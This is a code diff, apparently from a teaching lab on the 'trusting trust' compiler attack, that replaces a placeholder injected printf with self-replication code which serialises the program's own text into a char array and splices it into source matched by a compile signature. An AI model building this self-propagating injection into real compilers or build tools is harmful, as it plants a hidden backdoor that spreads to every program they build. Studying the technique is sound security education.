@@ -42,20 +42,37 @@ static char compile_sig[] =
 // and inject a placeholder "attack":
 // inject this after the assert above after the call to fopen.
 // not much of an attack.   this is just a quick placeholder.
-static char compile_attack[] = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";
+// static char compile_attack[] = "printf(\"%s: could have run your attack here!!\\n\", __FUNCTION__);";
 
 match_ptr = strstr(program, compile_sig);
-
+#define BUFF_SIZE 50000
+static char compile_attack[BUFF_SIZE];
+// compile_attack[BUFF_SIZE - 1] = '\0';
+// the attack code now is the self-replication code
 if (match_ptr != NULL)
 {
-    char *start_second_part = match_ptr + strlen(compile_sig);
+    /* ... I'm not so sure here ...*/
+    // Propagate the ASCII array
+    int i;
+    int offset = 0;
+    offset += snprintf(compile_attack + offset, sizeof(compile_attack) - offset, "char prog[] = {\n");
+    for (i = 0; prog[i]; i++)
+        offset += snprintf(compile_attack + offset, sizeof(compile_attack) - offset, "\t%d,%c", prog[i], (i + 1) % 8 == 0 ? '\n' : ' ');
+    offset += snprintf(compile_attack + offset, sizeof(compile_attack) - offset, "0 };\n");
 
+    // print actual program text
+    offset += snprintf(compile_attack + offset, sizeof(compile_attack) - offset, prog);
+    compile_attack[offset] = '\0'; // maybe it helps with the len
+
+    char *start_second_part = match_ptr + strlen(compile_sig);
     size_t len_first_part = match_ptr - program;
     size_t len_to_insert = strlen(compile_attack);
     size_t len_second_part = strlen(start_second_part);
     size_t new_size = len_first_part + strlen(compile_sig) + len_to_insert + len_second_part + 1;
 
     new_prog = malloc(sizeof(char) * new_size);
+
+    // Concatenate all the part
     strncpy(new_prog, program, len_first_part);
     new_prog[len_first_part] = '\0'; // for strcat
     strcat(new_prog, compile_sig);
@@ -63,10 +80,4 @@ if (match_ptr != NULL)
     strcat(new_prog, start_second_part);
 }
 
-// char* new_compile = new_prog;
 program = new_prog;
-prog_bytes = prog;
-// if (new_compile != NULL){
-//     fprintf(fp, "%s", new_compile);
-//     fclose(fp);
-// }
